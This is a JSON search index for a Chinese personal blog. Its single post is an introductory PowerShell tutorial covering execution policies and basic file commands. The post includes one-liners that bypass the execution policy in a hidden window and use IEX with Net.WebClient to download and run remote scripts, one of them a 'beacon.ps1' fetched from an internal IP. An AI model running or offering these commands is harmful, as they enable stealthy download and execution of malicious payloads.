{"meta":{"title":"sunflowers's Blog","subtitle":"sunflowers","description":null,"author":"麻瓜","url":"http://www.sunflowers.vip","root":"/"},"pages":[{"title":"404","text":"","path":"404.html","date":"07-19","excerpt":""},{"title":"404","text":"","path":"404/index.html","date":"08-16","excerpt":""},{"title":"about","text":"","path":"about/index.html","date":"08-16","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"08-16","excerpt":""}],"posts":[{"title":"Powershell入门学习","text":"PowerShell入门学习PowerShell简介PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用. NET Framework的强大功能。它的脚本后缀为.ps1。PowerShell脚本可以运行在内存中，不需要写入磁盘。 PowerShell命令查询当前执行策略：Get-ExecutionPolicy 执行策略：powershell有四种执行策略 1、Restricted：脚本不能运行（默认设置）。 2、RemoteSigned：本地创建的脚本可运行，从网上下载的不能运行（拥有数字签名的除外） 3、AllSigned：仅当脚本由受信任的发布者签名时才能运行。 4、Unrestricted：允许所有的脚本运行。 设置当前执行策略：Set-ExecutionPolicy （以管理员身份执行） 运行脚本：当前目录下./name.ps1运行 其他目录以绝对路径运行 绕过本地权限执行：PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 本地隐藏绕过权限执行脚本：PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Nonlnteractive -NoProfile -File xxx.ps1 用IEX下载远程PS1脚本绕过权限执行：PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(“xxx.ps1”);[Parameters] 1234powershell.exe IEX (New-Object System.Net.Webclient).DownloadFile(&#x27;http://10.10.10.1:1234/beacon.ps1&#x27;,&#x27;C:\\www\\beacon.ps1&#x27;)powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.10.1:80/download/file.ext&#x27;) 新建目录：md test （内部调用的是New-item命令) /new-item test -type directory 新建文件：new-item test.txt -type file 删除目录：remove-item test 显示文本内容：set-content test.txt -value “Hello World!!!”（会覆盖掉原来的内容） 追加内容：add-content test.txt -value “Hello world!” 清除内容：clear-content test.txt","path":"PowerShell/","date":"08-15","excerpt":"","tags":[{"name":"powershell","slug":"powershell","permalink":"http://www.sunflowers.vip/tags/powershell/"}]}],"categories":[],"tags":[{"name":"powershell","slug":"powershell","permalink":"http://www.sunflowers.vip/tags/powershell/"}]}